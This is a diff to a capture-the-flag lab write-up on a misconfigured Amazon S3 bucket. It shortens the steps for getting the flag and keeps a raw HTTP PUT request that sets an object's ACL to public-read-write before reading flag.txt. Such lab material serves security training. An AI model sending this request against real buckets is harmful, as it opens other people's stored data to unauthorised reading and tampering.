@@ -29,26 +29,21 @@ After typing yes, the scene will be built automatically and quickly
 
 ## Get Flag
 
-![image-20220426152550418](../../../images/image-20220426152550418.png)
+access flag.txt
 
-We see the list of files that try to access index.html
-
-![image-20220426152651701](../../../images/image-20220426152651701.png)
-
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
+```shell
+hxsecxxxxx.s3.us-east-1.amazonaws.com/flag.txt
 ```
 
-Access is forbidden, but we can modify whether the object can be read or written by adding `public-read-write` to `x-amz-acl` in the request header via the PUT method
+![img](../../../images/1653022475.png)
 
-![image-20220426152744234](../../../images/image-20220426152744234.png)
+modify object acl
 
-![image-20220426172410852](../../../images/image-20220426172410852.png)
+![img](../../../images/1653022598.png)
 
 ```http
-PUT /index.html?acl HTTP/1.1
-Host: hxseclabteztq.s3.eu-west-1.amazonaws.com
+PUT /flag.txt?acl HTTP/1.1
+Host: hxsecxxxxx.s3.eu-west-1.amazonaws.com
 x-amz-acl: public-read-write
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
@@ -58,13 +53,9 @@ Connection: close
 Upgrade-Insecure-Requests: 1
 ```
 
-Then we get the ACL of this object and we see that all users can now read and write to it
+get flag
 
-![image-20220426172506589](../../../images/image-20220426172506589.png)
-
-Afterwards, when you visit index.html, you successfully get the flags
-
-![image-20220426172534934](../../../images/image-20220426172534934.png)
+![img](../../../images/1653022699.png)
 
 ## Destruction Challenge
 
